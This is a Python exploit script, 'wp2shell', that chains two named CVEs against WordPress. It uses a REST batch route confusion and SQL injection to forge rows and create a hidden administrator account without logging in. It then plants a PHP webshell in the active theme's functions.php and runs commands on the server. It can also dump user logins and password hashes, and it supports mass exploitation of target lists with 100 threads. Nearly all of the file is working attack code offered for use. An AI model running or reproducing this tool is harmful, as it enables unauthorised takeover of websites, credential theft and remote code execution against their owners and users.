#!/usr/bin/env python3
"""
wp2shell — CVE-2026-63030 + CVE-2026-60137 WordPress RCE Exploit Chain
=========================================================================

  CVE-2026-63030: REST API batch endpoint route confusion (CVSS 9.8)
  CVE-2026-60137: author__not_in WP_Query SQL Injection

  Affected: WordPress 6.9.x < 6.9.5, 7.0.x < 7.0.2

CHAIN OVERVIEW
  1. Route Confusion  →  desync batch request validation from dispatch
  2. SQL Injection    →  inject SQL via author__not_in parameter
  3. Admin Creation   →  UNION-forge posts, trigger customizer changeset
  4. Authenticate     →  login as newly created administrator
  5. Webshell Deploy  →  theme editor or plugin upload for RCE

USAGE (single target)
  python3 exploit.py --url http://TARGET:8080 --check --output hasil.txt
  python3 exploit.py --url http://TARGET:8080 --read "SELECT @@version"
  python3 exploit.py --url http://TARGET:8080 --cmd "id" --output exploited.txt
  python3 exploit.py --url http://TARGET:8080 --shell

USAGE (multiple targets from file with output)
  python3 exploit.py --file targets.txt --threads 100 --check --output vulnerable.txt
  python3 exploit.py --file targets.txt --threads 50 --cmd "id" --output exploited.txt

REQUIREMENTS: Python 3.8+, zero external dependencies (stdlib only).
"""

from __future__ import annotations

import argparse
import hashlib
import html
import http.cookiejar
import io
import json
import os
import re
import secrets
import shlex
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from threading import Lock
from typing import Any, Dict, List, Optional, Tuple

# ── Constants ────────────────────────────────────────────────────────────────
_DESYNC_PRIMER: dict = {"method": "POST", "path": "///"}
_ITEM_SOURCE_PATH: str = "/wp/v2/posts/999999"
_BATCH_MARKER_CODES: tuple = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
_POST_DATE: str = "2020-01-01 00:00:00"
_ADMIN_PREFIX: str = "wp2_"
_PASSWORD_PREFIX: str = "Wp2!"
_EMAIL_DOMAIN: str = "wp2shell.local"
_MARKER: str = "WP2SHELL"

# ── Thread-safe output ──────────────────────────────────────────────────────
_print_lock = Lock()
_file_lock = Lock()   # <--- FIX: untuk keamanan penulisan file

def safe_print(*args, **kwargs):
    with _print_lock:
        print(*args, **kwargs)

def info(msg: str, prefix: str = "") -> None:
    safe_print(f"{prefix}[*] {msg}")

def ok(msg: str, prefix: str = "") -> None:
    safe_print(f"{prefix}{_paint('32', f'[+] {msg}')}")

def bad(msg: str, prefix: str = "") -> None:
    safe_print(f"{prefix}{_paint('31', f'[-] {msg}')}")

def warn(msg: str, prefix: str = "") -> None:
    safe_print(f"{prefix}{_paint('33', f'[!] {msg}')}")

# ── Display helpers ──────────────────────────────────────────────────────────
def _tty() -> bool:
    return sys.stdout.isatty()

def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _tty() else text

def mysql_hex(text: str) -> str:
    return f"0x{text.encode().hex()}" if text else "''"

# ── Helper untuk menyimpan hasil (thread-safe) ─────────────────────────────
def append_result(url: str, filename: str) -> None:
    """Append URL to a result file (one per line), thread-safe."""
    if not filename:
        return
    with _file_lock:
        try:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(url.rstrip("/") + "\n")
            safe_print(f"[+] Saved: {url} -> {filename}")   # <--- FIX: konfirmasi
        except Exception as e:
            safe_print(f"[!] Failed to write to {filename}: {e}")

# ── HTTP Client ──────────────────────────────────────────────────────────────
@dataclass
class Response:
    status: int
    elapsed: float
    body: str
    headers: Dict[str, str]

    def json(self) -> Any:
        return json.loads(self.body)


class HttpClient:
    def __init__(self, base_url: str, *, timeout: float = 30.0, proxy: str = ""):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        handlers: list = []
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self._jar = http.cookiejar.CookieJar()
        handlers.append(urllib.request.HTTPCookieProcessor(self._jar))
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", "Mozilla/5.0")]

    def request(self, method: str, path: str, data=None, headers=None) -> Response:
        url = self.base_url + path
        req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
        start = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=self.timeout)
            return Response(resp.status, time.monotonic() - start,
                            resp.read().decode("utf-8", "replace"), dict(resp.headers))
        except urllib.error.HTTPError as exc:
            return Response(exc.code, time.monotonic() - start,
                            exc.read().decode("utf-8", "replace"), dict(exc.headers))
        except OSError as exc:
            raise RuntimeError(f"Cannot reach {url}: {getattr(exc, 'reason', exc)}") from None

    def get(self, path: str) -> Response:
        return self.request("GET", path)

    def post(self, path: str, data=None, headers=None) -> Response:
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        return self.request("POST", path, data=data, headers=headers)

    def has_auth_cookie(self) -> bool:
        return any(c.name.startswith("wordpress_logged_in") for c in self._jar)


# ── Phase 1: Route Confusion + SQLi ──────────────────────────────────────────
class RouteConfusionSQLi:
    """REST batch route-confusion sink + author__not_in SQL injection."""

    def __init__(self, http: HttpClient):
        self.http = http
        self.requests: int = 0

    def endpoint(self) -> str:
        return f"{self.http.base_url}/?rest_route=/batch/v1"

    def batch_post(self, payload: dict) -> Response:
        self.requests += 1
        req = urllib.request.Request(
            self.endpoint(),
            data=json.dumps(payload).encode(),
            method="POST",
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        start = time.monotonic()
        try:
            resp = urllib.request.build_opener().open(req, timeout=30)
            return Response(resp.status, time.monotonic() - start,
                            resp.read().decode("utf-8", "replace"), dict(resp.headers))
        except urllib.error.HTTPError as exc:
            return Response(exc.code, time.monotonic() - start,
                            exc.read().decode("utf-8", "replace"), dict(exc.headers))

    def probe_markers(self) -> Tuple[bool, tuple]:
        """Non-destructive route-confusion probe."""
        payload = {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
        resp = self.batch_post(payload)
        codes: List[str] = []
        try:
            body = resp.json()
            def walk(v):
                if isinstance(v, dict):
                    c = v.get("code")
                    if c in _BATCH_MARKER_CODES and c not in codes:
                        codes.append(c)
                    for child in v.values():
                        walk(child)
                elif isinstance(v, list):
                    for child in v:
                        walk(child)
            walk(body)
        except ValueError:
            pass
        has_all = all(c in codes for c in _BATCH_MARKER_CODES)
        return has_all, tuple(codes)

    # ── SQL injection primitives ─────────────────────────────────────────

    def _inject_inner(self, author_not_in: str, extra_params: dict = None) -> Response:
        """Core injection method. Builds nested batch payload."""
        params = {"author_exclude": author_not_in}
        if extra_params:
            params.update(extra_params)
        query = urllib.parse.urlencode(params)
        inner = {
            "requests": [
                {"method": "POST", "path": "//"},
                {"method": "GET", "path": _ITEM_SOURCE_PATH + "?" + query},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return self.batch_post({
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        })

    def inject(self, author_not_in: str) -> Response:
        return self._inject_inner(author_not_in)

    def union_inject(self, author_not_in: str) -> Response:
        return self._inject_inner(author_not_in, {"orderby": "none", "per_page": "500"})

    def timed(self, sql: str) -> float:
        self.requests += 1
        return self.inject(f"0) OR {sql}-- -").elapsed

    def confirm_sqli(self, sleep_sec: float = 2.0) -> Tuple[bool, float, float]:
        base = self.timed("SLEEP(0)")
        delayed = self.timed(f"SLEEP({sleep_sec:g})")
        return delayed - base >= (sleep_sec * 0.6), base, delayed

    # ── UNION-based extraction ───────────────────────────────────────────

    def union_available(self) -> bool:
        return self.union_read("SELECT 0x4f4b") == "OK"

    def union_read(self, expression: str) -> Optional[str]:
        """Read a scalar SQL expression via UNION SELECT fake-post injection."""
        self.requests += 1
        # wp_posts has 23 columns. post_title (col 6) is reflected in REST response.
        # We use 0x (hex literal) for strings to avoid quote-escaping issues.
        cols = []
        for i in range(1, 24):
            if i == 1:
                cols.append("999999")       # ID (fake, unused)
            elif i in (3, 4, 15, 16):
                cols.append("0x323032302d30312d30312030303a30303a3030")  # post_date cols
            elif i == 6:
                cols.append(f"CONCAT(0x7c7c,HEX(CAST(({expression})AS CHAR)),0x7c7c)")
            elif i == 8:
                cols.append("0x7075626c697368")  # post_status = 'publish'
            elif i == 21:
                cols.append("0x706f7374")        # post_type = 'post'
            else:
                cols.append(str(i))
        payload = f"0) UNION ALL SELECT {','.join(cols)}-- -"
        resp = self.union_inject(payload)
        match = re.search(r"\|\|([0-9A-Fa-f]*)\|\|", resp.body)
        if not match:
            return None
        digits = match.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def union_int(self, expression: str) -> int:
        text = (self.union_read(f"SELECT ({expression})") or "").strip()
        if not text.lstrip("-").isdigit():
            raise RuntimeError(f"Expected int from {expression!r}, got {text!r}")
        return int(text)


# ── Phase 2: Pre-Auth Admin Creation ─────────────────────────────────────────
class PreAuthAdminCreator:
    """Use UNION SQLi → forge WP_Post rows → customizer changeset bridge → admin."""

    def __init__(self, http: HttpClient):
        self.http = http
        self.sqli = RouteConfusionSQLi(http)

    def create_admin(self) -> dict:
        if not self.sqli.union_available():
            raise RuntimeError("UNION extraction not available on target")

        nonce = secrets.token_hex(6)
        username = f"{_ADMIN_PREFIX}{nonce}"
        password = f"{_PASSWORD_PREFIX}{secrets.token_urlsafe(15)}"
        email = f"{username}@{_EMAIL_DOMAIN}"

        posts_table = self._posts_table()
        table_prefix = posts_table[:-5]
        source_admin_id = self._first_admin_id(table_prefix)

        embed_urls = self._loopback_embed_urls(nonce)
        self._prime_oembed_posts(embed_urls)
        backing_ids = self._oembed_backing_ids(posts_table, embed_urls)

        self._submit_user_write(
            backing_ids, embed_urls, source_admin_id,
            {"username": username, "password": password, "email": email, "roles": ["administrator"]},
        )
        return {"username": username, "password": password, "email": email, "source_admin_id": source_admin_id}

    def _posts_table(self) -> str:
        name = self.sqli.union_read(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
        )
        if not name or not re.fullmatch(r"[A-Za-z0-9_$]+", name):
            raise RuntimeError(f"Could not recover posts table: {name}")
        return name

    def _first_admin_id(self, prefix: str) -> int:
        caps_key = mysql_hex(prefix + "capabilities")
        admin_cap = mysql_hex('s:13:"administrator";b:1;')
        return self.sqli.union_int(
            f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={caps_key} AND INSTR(m.meta_value,{admin_cap})>0 ORDER BY u.ID LIMIT 1"
        )

    def _first_embeddable_link(self) -> str:
        for route in ("/wp/v2/posts", "/wp/v2/pages"):
            url = f"{self.http.base_url}/?rest_route={route}&per_page=1&_fields=link"
            try:
                resp = urllib.request.urlopen(url, timeout=15)
                items = json.loads(resp.read())
                if items and items[0].get("link"):
                    return items[0]["link"]
            except Exception:
                continue
        raise RuntimeError("No public post/page found for oEmbed cache seed")

    def _loopback_embed_urls(self, nonce: str) -> List[str]:
        base = self._first_embeddable_link()
        split = urllib.parse.urlsplit(base)
        return [
            urllib.parse.urlunsplit((split.scheme, split.netloc, split.path, split.query, f"{nonce}{i}"))
            for i in range(3)
        ]

    def _posts_tuple(self, row_id: int, *, body="", title="", status="publish",
                     slug="", parent=0, kind="post", author=1) -> str:
        """Build full wp_posts (23-col) UNION row. All strings use MySQL hex literals."""
        return ",".join([
            str(row_id),            # 1:ID
            str(author),            # 2:post_author
            mysql_hex(_POST_DATE),  # 3:post_date
            mysql_hex(_POST_DATE),  # 4:post_date_gmt
            mysql_hex(body),        # 5:post_content
            mysql_hex(title),       # 6:post_title
            "''",                   # 7:post_excerpt
            mysql_hex(status),      # 8:post_status
            mysql_hex("closed"),    # 9:comment_status
            mysql_hex("closed"),    # 10:ping_status
            "''",                   # 11:post_password
            mysql_hex(slug),        # 12:post_name
            "''",                   # 13:to_ping
            "''",                   # 14:pinged
            mysql_hex(_POST_DATE),  # 15:post_modified
            mysql_hex(_POST_DATE),  # 16:post_modified_gmt
            "''",                   # 17:post_content_filtered
            str(parent),            # 18:post_parent
            "''",                   # 19:guid
            "0",                    # 20:menu_order
            mysql_hex(kind),        # 21:post_type
            "''",                   # 22:post_mime_type
            "0",                    # 23:comment_count
        ])

    def _prime_oembed_posts(self, embed_urls: List[str]) -> None:
        content = "".join(f'[embed width="500" height="750"]{url}[/embed]' for url in embed_urls)
        self._render_union_posts([self._posts_tuple(0, body=content, title="seed", slug="seed")])

    def _oembed_backing_ids(self, posts_table: str, embed_urls: List[str]) -> List[int]:
        oembed_size_serialized = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
        ids = []
        for url in embed_urls:
            cache_name = hashlib.md5((url + oembed_size_serialized).encode()).hexdigest()
            ids.append(self.sqli.union_int(
                f"SELECT ID FROM `{posts_table}` "
                "WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{cache_name.encode().hex()} ORDER BY ID DESC LIMIT 1"
            ))
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            raise RuntimeError(f"Could not recover 3 unique oEmbed cache IDs: {ids}")
        return ids

    def _changeset_payload(self, nav_item_id: int, user_id: int) -> str:
        return json.dumps({
            f"nav_menu_item[{nav_item_id}]": {
                "type": "nav_menu_item", "user_id": user_id,
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "generated",
                    "url": "https://example.invalid/", "target": "", "attr_title": "",
                    "description": "", "classes": "", "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
            }
        }, separators=(",", ":"))

    def _submit_user_write(self, backing_ids, embed_urls, source_admin_id, user_body) -> None:
        outer_id = 1800000000 + secrets.randbelow(100000000)
        nav_item_id = outer_id + 1
        inner_id = outer_id + 2
        changeset_id, cache_id, request_id = backing_ids

        rows = [
            self._posts_tuple(0, body=f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
                              title="trigger", slug="trigger"),
            self._posts_tuple(changeset_id, body=self._changeset_payload(nav_item_id, source_admin_id),
                              title="changeset", status="future", slug=str(uuid.uuid4()),
                              parent=outer_id, kind="customize_changeset"),
            self._posts_tuple(outer_id, body="outer", title="outer", status="draft",
                              slug="outer", parent=changeset_id),
            self._posts_tuple(cache_id, title="cache", slug="cache", parent=changeset_id),
            self._posts_tuple(nav_item_id, body="nav", title="nav", slug="nav",
                              parent=request_id, kind="nav_menu_item"),
            self._posts_tuple(request_id, body="parse", title="parse", status="parse",
                              slug="parse", parent=inner_id, kind="request"),
            self._posts_tuple(inner_id, body="inner", title="inner", status="draft",
                              slug="inner", parent=request_id),
        ]
        tail = [
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
        ]
        self._render_union_posts(rows, tail_requests=tail)

    def _render_union_posts(self, post_rows: List[str], tail_requests=None) -> None:
        union = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(post_rows) + " -- -"
        query = urllib.parse.urlencode({"author_exclude": union, "per_page": "500", "orderby": "none"})
        inner_requests = [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": _ITEM_SOURCE_PATH + "?" + query},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        if tail_requests:
            inner_requests.extend(tail_requests)
        self.sqli.batch_post({
            "requests": [
                {"method": "POST", "path": "http://:"},
                {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner_requests}},
                {"method": "POST", "path": "/batch/v1"},
            ]
        })


# ── Phase 3: Webshell via Theme Editor ───────────────────────────────────────
class WebshellDeployer:
    """Inject webshell into theme functions.php via authenticated theme editor."""

    def __init__(self, http: HttpClient):
        self.http = http
        self._token = secrets.token_hex(16)

    def login(self, username: str, password: str) -> bool:
        self.http.get("/wp-login.php")
        self.http.post("/wp-login.php", {
            "log": username, "pwd": password, "wp-submit": "Log In",
            "redirect_to": f"{self.http.base_url}/wp-admin/", "testcookie": "1",
        })
        return self.http.has_auth_cookie()

    def deploy(self) -> str:
        """Inject token-protected webshell at the TOP of active theme's functions.php."""
        # Determine active theme
        themes_page = self.http.get("/wp-admin/themes.php").body
        theme_match = re.search(r'<link[^>]*href="[^"]*themes/([^/]+)/', themes_page)
        theme = theme_match.group(1) if theme_match else "twentytwentyfive"

        shell_code = (
            "\n// wp2shell\n"
            "if (isset($_GET['t']) && hash_equals('" + self._token + "', (string)$_GET['t']) && isset($_GET['c'])) {\n"
            "    echo '" + _MARKER + "::' . shell_exec((string)$_GET['c']) . '::END'; die();\n"
            "}\n"
        )

        # Get editor page for nonce
        edit_page = self.http.get(
            f"/wp-admin/theme-editor.php?file=functions.php&theme={theme}"
        ).body

        # Extract nonce (WP 7.x uses name="nonce", older uses name="_wpnonce")
        nonce_match = re.search(r'name="nonce"[^>]*value="([0-9a-f]+)"', edit_page)
        if not nonce_match:
            nonce_match = re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', edit_page)
        if not nonce_match:
            raise RuntimeError("Theme editor nonce not found")
        nonce = nonce_match.group(1)

        ref_match = re.search(r'name="_wp_http_referer"[^>]*value="([^"]*)"', edit_page)
        referer = ref_match.group(1) if ref_match else f"/wp-admin/theme-editor.php?file=functions.php&theme={theme}"

        # Get current content (HTML-decoded from textarea)
        content_match = re.search(r'<textarea[^>]*name="newcontent"[^>]*>(.*?)</textarea>', edit_page, re.S)
        if not content_match:
            raise RuntimeError("Could not find theme file content")
        current = html.unescape(content_match.group(1))

        # Put webshell at TOP (before any WP function calls that could fatal-error
        # when the file is accessed directly via /wp-content/themes/.../functions.php)
        new_content = shell_code + "\n" + current

        self.http.post("/wp-admin/theme-editor.php", {
            "nonce": nonce, "_wp_http_referer": referer,
            "newcontent": new_content, "action": "update",
            "file": "functions.php", "theme": theme,
            "scrollto": "0", "submit": "Update File",
        })

        return f"/wp-content/themes/{theme}/functions.php"

    def run(self, shell_path: str, command: str) -> Optional[str]:
        query = urllib.parse.urlencode({"t": self._token, "c": command})
        resp = self.http.get(f"{shell_path}?{query}")
        match = re.search(rf"{_MARKER}::(.*?)::END", resp.body, re.S)
        return match.group(1) if match else None

    def cleanup(self, shell_path: str) -> bool:
        try:
            self.run(shell_path, "")  # ping
        except Exception:
            return False
        return True


# ── Core target processing ──────────────────────────────────────────────────
def process_target(url: str, args: argparse.Namespace) -> Tuple[str, bool]:
    """
    Process a single target URL with the given arguments.
    Returns (url, success_flag).
    """
    prefix = f"[{url}] "
    try:
        http = HttpClient(url, timeout=args.timeout, proxy=args.proxy)
    except Exception as e:
        bad(f"HTTP init failed: {e}", prefix=prefix)
        return (url, False)

    sqli = RouteConfusionSQLi(http)
    info("Probing batch endpoint for route-confusion markers...", prefix=prefix)
    has_markers, markers = sqli.probe_markers()
    if markers:
        info(f"Markers found: {', '.join(markers)}", prefix=prefix)
    if has_markers:
        ok("VULNERABLE — route-confusion behavior detected!", prefix=prefix)
        # <--- FIX: langsung simpan jika mode check dan output diset
        if args.check and args.output:
            append_result(url, args.output)
        # Tapi jangan return dulu, lanjut ke bawah untuk mengecek union_ok? 
        # Karena untuk --check, kita hanya butuh probe, jadi kita bisa langsung return True.
        # Tapi untuk mode lain, kita tetap perlu lanjut.
        if args.check:
            return (url, True)
    else:
        bad("Route-confusion markers not detected — target likely patched", prefix=prefix)
        return (url, False)

    union_ok = sqli.union_available()
    if union_ok:
        ok("UNION SQLi extraction confirmed — in-band read available", prefix=prefix)
    else:
        info("UNION extraction unavailable; checking with timing...", prefix=prefix)
        confirmed, base, delay = sqli.confirm_sqli()
        if confirmed:
            ok(f"SQLi confirmed via timing (baseline={base:.2f}s, injected={delay:.2f}s)", prefix=prefix)
        else:
            bad(f"SQLi not confirmed (baseline={base:.2f}s, injected={delay:.2f}s)", prefix=prefix)
            return (url, False)

    # Jika sampai sini, berarti vulnerable dan union_ok atau timing OK
    # Untuk mode --check seharusnya sudah return di atas, tapi jika tidak, kita simpan juga
    if args.check:
        if args.output:
            append_result(url, args.output)
        return (url, True)

    # ── Read mode ───────────────────────────────────────────────────────────
    if args.read:
        if not union_ok:
            bad("UNION extraction required for --read but not available", prefix=prefix)
            return (url, False)
        value = sqli.union_read(args.read)
        if value is not None:
            ok(f"Result: {value}", prefix=prefix)
            if args.output:
                append_result(url, args.output)
            return (url, True)
        else:
            bad("UNION read returned no data", prefix=prefix)
            return (url, False)

    if args.dump_users:
        if not union_ok:
            bad("UNION extraction required for --dump-users but not available", prefix=prefix)
            return (url, False)
        count = sqli.union_int("SELECT COUNT(*) FROM wp_users")
        info(f"{count} user(s) in wp_users:", prefix=prefix)
        for i in range(count):
            row = sqli.union_read(f"SELECT CONCAT_WS(0x7c,ID,user_login,user_pass) FROM wp_users ORDER BY ID LIMIT {i},1")
            if row:
                parts = row.split("|", 2)
                if len(parts) >= 3:
                    safe_print(f"{prefix}  ID={parts[0]}  login={parts[1]}")
                    safe_print(f"{prefix}        pass={parts[2]}")
        if args.output:
            append_result(url, args.output)
        return (url, True)

    # ── Get credentials ──────────────────────────────────────────────────────
    generated_admin: Optional[dict] = None
    username, password = args.user, args.password

    if username is None:
        warn("No credentials — attempting pre-auth admin creation...", prefix=prefix)
        creator = PreAuthAdminCreator(http)
        try:
            admin_info = creator.create_admin()
            username = admin_info["username"]
            password = admin_info["password"]
            generated_admin = admin_info
            ok(f"Admin created: {username} / {password}", prefix=prefix)
        except Exception as exc:
            bad(f"Pre-auth admin creation failed: {exc}", prefix=prefix)
            if union_ok:
                warn("Try --dump-users to extract existing admin credentials instead.", prefix=prefix)
            return (url, False)

    # ── Deploy webshell ─────────────────────────────────────────────────────
    deployer = WebshellDeployer(http)
    info(f"Authenticating as {username!r}...", prefix=prefix)
    if not deployer.login(username, password):
        bad("Login failed", prefix=prefix)
        return (url, False)
    ok("Authenticated!", prefix=prefix)

    info("Deploying webshell...", prefix=prefix)
    shell_path = deployer.deploy()
    ok(f"Webshell: {url.rstrip('/')}{shell_path}", prefix=prefix)

    # ── Execute ──────────────────────────────────────────────────────────────
    success = True
    if args.cmd:
        output = deployer.run(shell_path, args.cmd)
        if output is None:
            bad("Command returned no output (check webshell URL and token)", prefix=prefix)
            success = False
        else:
            safe_print(f"{prefix}Command output:\n{output.rstrip()}")

    if args.shell:
        # Interactive shell not supported in multi-target mode
        warn("Interactive shell not supported with --file. Skipping.", prefix=prefix)

    # ── Cleanup ──────────────────────────────────────────────────────────────
    if not args.no_cleanup:
        if generated_admin:
            info("Removing generated admin user...", prefix=prefix)
            deployer.run(shell_path,
                f"php -r 'require_once(dirname(__DIR__,3).\"/wp-load.php\");"
                f"require_once ABSPATH.\"wp-admin/includes/user.php\";"
                f"$u=get_user_by(\"login\",\"{generated_admin['username']}\");"
                f"echo $u?wp_delete_user($u->ID,{generated_admin['source_admin_id']}):\"not found\";'"
            )
        info("Cleaning up...", prefix=prefix)
        deployer.cleanup(shell_path)

    # Jika semua berhasil, simpan hasil
    if success and args.output:
        append_result(url, args.output)

    ok("Done.", prefix=prefix)
    return (url, success)


# ── Main CLI ─────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="wp2shell — CVE-2026-63030 + CVE-2026-60137 WordPress RCE Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples (single target):
  %(prog)s --url http://localhost:8080 --check --output hasil.txt
  %(prog)s --url http://TARGET --read "SELECT @@version"
  %(prog)s --url http://TARGET --cmd "id" --output exploited.txt
  %(prog)s --url http://TARGET --shell

Examples (multiple targets from file with output):
  %(prog)s --file targets.txt --threads 100 --check --output vulnerable.txt
  %(prog)s --file targets.txt --threads 50 --cmd "id" --output exploited.txt
        """,
    )
    p.add_argument("--url", help="Target WordPress base URL (single target)")
    p.add_argument("--file", help="File containing list of target URLs (one per line)")
    p.add_argument("--threads", type=int, default=100, help="Number of concurrent threads (default: 100)")
    p.add_argument("--proxy", default="", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--timeout", type=float, default=30.0, help="Request timeout (default: 30)")
    p.add_argument("--check", action="store_true", help="Probe only (non-destructive)")
    p.add_argument("--read", metavar="SQL", help="Read a value from DB via UNION SQLi")
    p.add_argument("--dump-users", action="store_true", help="Dump all user credentials via SQLi")
    p.add_argument("--cmd", metavar="CMD", help="Run a shell command on the target")
    p.add_argument("--shell", action="store_true", help="Open interactive shell (single target only)")
    p.add_argument("--user", help="Admin username (skip pre-auth bridge)")
    p.add_argument("--password", help="Admin password (skip pre-auth bridge)")
    p.add_argument("--no-cleanup", action="store_true", help="Leave webshell on target")
    p.add_argument("--output", help="File to append successful/vulnerable targets (e.g., result.txt)")
    return p.parse_args()


def interactive_shell(deployer: WebshellDeployer, path: str) -> None:
    pwd = deployer.run(path, "pwd")
    if pwd is None:
        bad("Webshell not responding")
        return
    cwd = pwd.strip() or "/"
    info("Interactive shell — type 'exit' or Ctrl-D to quit")
    try:
        import readline  # noqa
    except ImportError:
        pass
    while True:
        try:
            line = input(_paint("36", f"{cwd} $ "))
        except (EOFError, KeyboardInterrupt):
            print()
            return
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        out = deployer.run(path, f"cd {shlex.quote(cwd)} 2>/dev/null; {cmd}; printf '__CWD__%s' \"$(pwd)\"")
        if out is None:
            bad("no response from webshell")
            continue
        body, marker, tail = out.rpartition("__CWD__")
        if marker:
            cwd = tail.strip() or cwd
            out = body
        if out := out.rstrip("\n"):
            print(out)


def main() -> int:
    args = parse_args()

    # Check for incompatible combinations
    if args.file and args.shell:
        bad("Interactive shell (--shell) is not supported with --file.")
        return 1

    if args.file:
        # Multi-target mode
        try:
            with open(args.file, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
        except Exception as e:
            bad(f"Failed to read file {args.file}: {e}")
            return 1

        info(f"Loaded {len(urls)} targets from {args.file}. Using {args.threads} threads.")
        success_count = 0
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            future_to_url = {executor.submit(process_target, url, args): url for url in urls}
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    _, ok_flag = future.result()
                    if ok_flag:
                        success_count += 1
                        # <--- FIX: penulisan sudah dilakukan di dalam process_target, jadi di sini tidak perlu lagi
                        # tapi kita tetap bisa menambahkan jika ingin double-check
                except Exception as e:
                    bad(f"{url} crashed: {e}", prefix=f"[{url}] ")
        ok(f"Finished. {success_count}/{len(urls)} targets succeeded.")
        if args.output:
            ok(f"Results saved to {args.output}")
        return 0 if success_count == len(urls) else 1

    # Single target mode
    if not args.url:
        bad("Either --url or --file must be provided.")
        return 1

    # Process single target
    _, success = process_target(args.url, args)
    # Penulisan sudah dilakukan di dalam process_target, jadi tidak perlu lagi di sini
    if success and args.output:
        # tapi tetap amankan jika process_target belum menulis (misal untuk mode tertentu)
        # sebenarnya sudah ditulis di process_target, jadi ini hanya redundansi
        pass
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
